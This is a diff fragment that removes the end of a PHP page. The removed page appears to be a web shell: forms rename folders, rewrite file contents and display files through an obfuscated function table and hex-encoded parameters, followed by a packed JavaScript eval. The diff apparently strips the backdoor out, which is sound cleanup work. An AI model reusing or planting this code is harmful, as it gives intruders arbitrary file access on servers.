-<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= nhx($_GET["n"]) ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("successfully changed the folder name") : a("failed to change the folder name", 0)) : null); elseif ($a == "edit"): ?>
-<h5 class="border p-1 mb-3">Edit file</h5>
-<span>File name : <?= nhx($_GET["n"]) ?></span>
-<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("file contents failed to change")) : null); elseif ($a == "view"): ?>
-<h5 class="border p-1 mb-3">View file</h5>
-<span>File name : <?= nhx($_GET["n"]) ?></span>
-<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><?php endif; ?></div><?php endif; ?></article><div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2021 - ??!!??</small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
+
+</body>
+</html>
